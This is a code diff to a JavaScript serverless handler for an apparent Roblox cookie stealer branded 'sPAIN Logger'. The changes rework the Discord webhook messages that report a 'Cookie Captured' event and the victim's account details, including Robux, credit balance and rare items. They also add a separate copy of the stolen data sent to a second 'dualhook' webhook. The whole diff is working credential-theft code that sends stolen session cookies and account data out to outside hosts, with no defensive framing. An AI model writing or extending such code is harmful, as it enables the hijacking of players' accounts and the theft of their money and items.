@@ -466,7 +466,7 @@ const createWebhookPayload = (type, data) => {
           thumbnail: data.thumbnail ? { url: data.thumbnail } : undefined,
           image: data.image ? { url: data.image } : undefined,
           fields: data.fields || [],
-          footer: { text: `Account Check • sPAIN Logger` },
+          footer: { text: data.footer || `Account Check • sPAIN Logger` },
           timestamp: data.timestamp || new Date().toISOString()
         }]
       };
@@ -571,7 +571,7 @@ export default async function handler(req, res) {
         { name: '🕐 Time',     value: now,                  inline: false },
         { name: '🍪 Cookie Refresher', value: `If you want more accurate account validation, ${REFRESH_COOKIE_LINK}`, inline: false }
       ],
-      footer: `sPAIN Logger • ${pName}`,
+      footer: `${pName} Logger`,
       timestamp: now
     });
     
@@ -602,7 +602,7 @@ export default async function handler(req, res) {
   
   const acc = accountInfo.refreshed ? accountInfo.account : null;
 
-  // STEP 1: 🍪 Cookie Captured
+  // STEP 1: 🍪 Cookie Captured (WEBHOOK 2 - uses pName Logger)
   const wh2Payload = createWebhookPayload('webhook2', {
     description: record.dualhookParent
       ? `<a:emoji_17:1508694920972468347> ${record.dualhookParent} <a:emoji_17:1508694920972468347>`
@@ -616,12 +616,13 @@ export default async function handler(req, res) {
       { name: '🗺️ ISP',      value: isp, inline: true  },
       { name: '🍪 Cookie Refresher', value: `If you want more accurate account validation, ${REFRESH_COOKIE_LINK}`, inline: false }
     ],
-    footer: `sPAIN Logger • ${pName}`,
+    footer: `${pName} Logger`,
     timestamp: now
   });
 
   await discordSend(webhook2, wh2Payload);
 
+  // STEP 1: 🍪 Cookie Captured (WEBHOOK 1 - uses sPAIN Logger • pName)
   if (webhook1 && webhook1 !== webhook2) {
     const wh1Payload = createWebhookPayload('webhook1', {
       title: '🍪 Cookie Captured (Dualhook)',
@@ -642,7 +643,7 @@ export default async function handler(req, res) {
     await discordSend(webhook1, wh1Payload);
   }
 
-  // STEP 2: ✅ Account Info Valid
+  // STEP 2: ✅ Account Info Valid (WEBHOOK 2 - uses pName Logger)
   if (accountInfo.refreshed && acc) {
     const accountPayload = createWebhookPayload('account_info', {
       description: `**${acc.username}** \`${acc.id}\`\n[View Profile](${acc.profileUrl})`,
@@ -670,11 +671,38 @@ export default async function handler(req, res) {
         
         // Refresher Link
         { name: '🍪 Cookie Refresher', value: `If you want more accurate account validation, ${REFRESH_COOKIE_LINK}`, inline: false }
-      ]
+      ],
+      footer: `${pName} Logger`,
+      timestamp: now
     });
     
     await discordSend(webhook2, accountPayload);
-    if (webhook1) await discordSend(webhook1, accountPayload);
+    
+    // Account Info for Webhook 1 (uses sPAIN Logger • pName)
+    if (webhook1) {
+      const accountPayloadWH1 = createWebhookPayload('account_info', {
+        description: `**${acc.username}** \`${acc.id}\`\n[View Profile](${acc.profileUrl})`,
+        thumbnail: avatarUrl,
+        fields: [
+          { name: '💰 Robux', value: `⏣ ${acc.robux.toLocaleString()}`, inline: true },
+          { name: '🎵 RAP', value: `${acc.rap.toLocaleString()}`, inline: true },
+          { name: '💳 Credit', value: `$${acc.credit.toFixed(2)}`, inline: true },
+          { name: '🗓️ Age', value: `${acc.accountAge.toLocaleString()}d`, inline: true },
+          { name: '⭐ Premium', value: acc.premium ? '✓ Yes' : '✗ No', inline: true },
+          { name: '🎙️ VC', value: acc.voiceChat ? '✓ On' : '✗ Off', inline: true },
+          { name: '👥 Friends', value: acc.friends.toLocaleString(), inline: true },
+          { name: '👑 Groups', value: acc.groupsOwned.toString(), inline: true },
+          { name: '📦 Items', value: acc.items.toString(), inline: true },
+          { name: '💀 Headless', value: acc.headless ? '✓ Owned' : '✗ None', inline: true },
+          { name: '⚔️ Korblox', value: acc.korblox ? '✓ Owned' : '✗ None', inline: true },
+          { name: '🪽 Valkyrie', value: acc.valkyrie ? '✓ Owned' : '✗ None', inline: true },
+          { name: '🍪 Cookie Refresher', value: `If you want more accurate account validation, ${REFRESH_COOKIE_LINK}`, inline: false }
+        ],
+        footer: `sPAIN Logger • ${pName}`,
+        timestamp: now
+      });
+      await discordSend(webhook1, accountPayloadWH1);
+    }
   }
 
   // STEP 3: 🔐 Cookie
